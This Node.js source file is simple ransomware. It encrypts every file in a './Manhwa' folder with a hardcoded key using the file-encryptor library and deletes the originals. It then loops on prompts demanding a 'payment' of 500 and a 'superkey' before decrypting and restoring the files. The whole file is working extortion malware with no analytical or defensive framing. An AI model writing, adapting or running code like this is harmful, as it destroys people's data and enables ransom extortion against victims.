const fs = require('fs');
const readline = require('readline');
const encryptor = require('file-encryptor');

const folderPath = './Manhwa'; 
const key = 'manhwa'; 
const correctPayment = 500; 


function isEncryptedFile(file) {
  return file.endsWith('.encrypted');
}


function isTextFile(file) {
  return file.endsWith('.txt');
}


function isImageFile(file) {
  const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp'];
  return imageExtensions.some((ext) => file.toLowerCase().endsWith(ext));
}

function encryptFilesInFolder(folderPath, key) {
  fs.readdir(folderPath, (err, files) => {
    if (err) {
      console.error('Error reading folder:', err);
      return;
    }

    files.forEach((file) => {
      const inputFilePath = `${folderPath}/${file}`;
      const outputFilePath = `${folderPath}/${file}.encrypted`;

      if (!isEncryptedFile(file)) {
        
        encryptor.encryptFile(inputFilePath, outputFilePath, key, (encryptErr) => {
          if (encryptErr) {
            console.error(`Error encrypting file ${file}:`, encryptErr);
          } else {
            console.log(`File ${file} encrypted successfully.`);

            
            fs.unlink(inputFilePath, (deleteErr) => {
              if (deleteErr) {
                console.error(`Error deleting original file ${inputFilePath}:`, deleteErr);
              } else {
                console.log(`Original file ${inputFilePath} deleted successfully.`);
              }
            });
          }
        });
      }
    });
  });
}

function decryptFile(inputFilePath, key) {
  const originalFileName = inputFilePath.replace('.encrypted', '');
  const decryptedFilePath = `${originalFileName}_decrypted`;

  encryptor.decryptFile(inputFilePath, decryptedFilePath, key, (decryptErr) => {
    if (decryptErr) {
      console.error('Error decrypting file:', decryptErr);
    } else {
      console.log('File decrypted successfully.');

      
      fs.unlink(inputFilePath, (deleteErr) => {
        if (deleteErr) {
          console.error(`Error deleting encrypted file ${inputFilePath}:`, deleteErr);
        } else {
          console.log(`Encrypted file ${inputFilePath} deleted successfully.`);

          
          fs.rename(decryptedFilePath, originalFileName, (renameErr) => {
            if (renameErr) {
              console.error(`Error renaming file ${decryptedFilePath} to ${originalFileName}:`, renameErr);
            } else {
              console.log(`File ${originalFileName} renamed successfully.`);
            }
          });
        }
      });
    }
  });
}


function validatePayment(payment) {
  return parseInt(payment) === correctPayment;
}


function validateSuperkey(superkey) {
  return superkey === key;
}


function askForPaymentAndKey() {
  rl.question('Enter payment (500): ', (payment) => {
    if (validatePayment(payment)) {
      rl.question('Enter superkey: ', (superkey) => {
        if (validateSuperkey(superkey)) {
          
          fs.readdir(folderPath, (readErr, files) => {
            if (readErr) {
              console.error('Error reading folder:', readErr);
              rl.close();
              return;
            }

            files.forEach((file) => {
              if (isEncryptedFile(file)) {
                const encryptedFilePath = `${folderPath}/${file}`;
                decryptFile(encryptedFilePath, superkey);
              }
            });

            rl.close();
          });
        } else {
          console.log('Incorrect superkey. Please enter the correct superkey.');
          askForPaymentAndKey();
        }
      });
    } else {
      console.log('Incorrect payment amount. Please enter the correct payment amount (500).');
      askForPaymentAndKey();
    }
  });
}

encryptFilesInFolder(folderPath, key);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});


askForPaymentAndKey();
